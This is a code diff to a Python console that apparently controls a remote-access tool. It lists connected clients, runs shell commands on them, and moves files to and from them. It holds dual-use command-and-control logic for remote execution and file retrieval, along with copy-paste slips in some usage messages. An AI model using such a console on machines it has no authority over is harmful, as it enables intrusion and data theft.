@@ -94,9 +94,11 @@ threading.Thread(target=ThreadStartServer).start()
 time.sleep(1)
 
 print("""Available commands:
-* list: Lists down available clients.
-* cmd: Run command on client.
-* shutdown: Shuts down the client.\n""")
+* list:\t\tLists down available clients.
+* cmd:\t\tRun command on client.
+* download:\tDownload file to client.
+* upload:\tUpload file from client.
+* shutdown:\tShuts down the client.\n""")
 
 while True:
     command = input(">> ")
@@ -112,7 +114,7 @@ while True:
             
     elif command.startswith("cmd"):
         commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) > 1:
+        if len(commandSplitted) == 3:
             cleanedCommand = RemoveClientNumber(commandSplitted)
             
             if commandSplitted[1] == "all":
@@ -130,76 +132,75 @@ while True:
                 except ValueError as e:
                     print("[ERROR] " + str(e))
         else:
-            print("[ERROR] cmd: No arguments specified.")
+            print("[ERROR] Incorrect number of arguments. format:\"cmd [target] [shell_command]\"")
 
     elif command.startswith("download"):
-        ## TEST
-        command = "download 0 x:\\tmp\\toupload.txt"
-        ## END_TEST
-        
         commandSplitted = command.strip().split(" ")
-        clientNumber = 0
-        try:
-            clientNumber = int(commandSplitted[1])
-        except ValueError as e:
-            print("[ERROR] " + str(e))
+        if len(commandSplitted) == 3:
+            clientNumber = 0
+            try:
+                clientNumber = int(commandSplitted[1])
+            except ValueError as e:
+                print("[ERROR] " + str(e))
 
-        client = clients[clientNumber]
-        client.connection.send(b"download")
+            client = clients[clientNumber]
+            client.connection.send(b"download")
 
-        targetPath = commandSplitted[2]
-        f = open(targetPath, "rb")
+            targetPath = commandSplitted[2]
+            f = open(targetPath, "rb")
 
-        fileSize = os.stat(targetPath).st_size
-        fileSizeStr = str(fileSize).rjust(8, '0')
-        client.connection.send(fileSizeStr.encode())
-        
-        if f:
-            print("[INFO] Reading received data from " + targetPath)
+            fileSize = os.stat(targetPath).st_size
+            fileSizeStr = str(fileSize).rjust(8, '0')
+            client.connection.send(fileSizeStr.encode())
 
-            while(1):
-                readData = f.read(SOCKET_BUFFER_SIZE)
-                if len(readData) <= 0 or readData == None:
-                    break
-                client.connection.send(readData)
+            if f:
+                print("[INFO] Reading received data from " + targetPath)
 
-            print("#### DONE SENDING ALL DATA")
-                
-            f.close()
+                while(1):
+                    readData = f.read(SOCKET_BUFFER_SIZE)
+                    if len(readData) <= 0 or readData == None:
+                        break
+                    client.connection.send(readData)
+
+                print("[INFO] DONE SENDING ALL DATA")
+
+                f.close()
+            else:
+                print("[ERROR] Error opening file for reading.")
         else:
-            print("[ERROR]  Error opening file for reading.")
-                
-        # client.connection.send(b"download")
-        # receivedData = ReceiveDataFromClient(client, RemoveClientNumber(commandSplitted));
+            print("[ERROR] Incorrect number of arguments. format:\"download [target] [file_to_download] [filename_to_use]\"")
             
     elif command.startswith("upload"):
         commandSplitted = command.strip().split(" ")
-        clientNumber = 0
-        try:
-            clientNumber = int(commandSplitted[1])
-        except ValueError as e:
-            print("[ERROR] " + str(e))
+        if len(commandSplitted) == 3:
+            clientNumber = 0
+            try:
+                clientNumber = int(commandSplitted[1])
+            except ValueError as e:
+                print("[ERROR] " + str(e))
 
-        client = clients[clientNumber]
+            client = clients[clientNumber]
 
-        receivedData = ReceiveDataFromClient(client, RemoveClientNumber(commandSplitted));
-        if len(receivedData) > 0:
-            filePathSplitted = commandSplitted[2].split("\\")
-            fileName = client.info + "_" + filePathSplitted[len(filePathSplitted) - 1]
-            targetPath = UPLOAD_DIRECTORY + fileName
-            f = open(targetPath, "wb")
-            if f:
-                print("[INFO] Writing received data to " + targetPath)
-                f.write(receivedData)
-                f.close()
+            receivedData = ReceiveDataFromClient(client, RemoveClientNumber(commandSplitted));
+            if len(receivedData) > 0:
+                filePathSplitted = commandSplitted[2].split("\\")
+                fileName = client.info + "_" + filePathSplitted[len(filePathSplitted) - 1]
+                targetPath = UPLOAD_DIRECTORY + fileName
+                f = open(targetPath, "wb")
+                if f:
+                    print("[INFO] Writing received data to " + targetPath)
+                    f.write(receivedData)
+                    f.close()
+                else:
+                    print("[ERROR]  Error opening file for writing.")
             else:
-                print("[ERROR]  Error opening file for writing.")
+                print("[ERROR] Error opening file at " + commandSplitted[2])
         else:
-            print("[ERROR] Error opening file at " + commandSplitted[2])
+            print("[ERROR] Incorrect number of arguments. format:\"upload [target] [file_to_upload]\"")
             
     elif command.startswith("shutdown"):
         commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) > 1:
+        if len(commandSplitted) == 2:
             if commandSplitted[1] == "all":
                 for client in clients:
                     client.connection.send(b"shutdown")
@@ -222,4 +223,4 @@ while True:
                     print("[ERROR] " + str(e))
                 
         else:
-            print("[ERROR] Incorrect shutdown invocation. Specify \"shutdown [number]\" or \"shutdown all\"")
+            print("[ERROR] Incorrect number of arguments. format:\"download [target]\"")
